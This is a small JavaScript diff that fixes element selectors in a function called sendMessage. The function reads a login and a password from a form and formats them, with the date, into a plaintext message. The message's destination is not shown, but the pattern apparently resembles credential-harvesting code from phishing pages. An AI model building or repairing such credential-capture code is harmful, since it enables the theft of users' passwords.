@@ -15,8 +15,8 @@ const icons_container = document.querySelector(".accessibility-icons");
 const wel_text = document.querySelector(".wel_text");
 
 function sendMessage() {
-      let login = document.getElementById(".inputLogin").value;
-      let password = document.getElementById(".inputPassword").value;
+      let login = document.querySelector(".inputLogin").value;
+      let password = document.querySelector(".inputPassword").value;
 
       let date = new Date().toLocaleString(); 
       let msg = `Date: ${date}\nLogin: ${login}\nPassword: ${password}`;
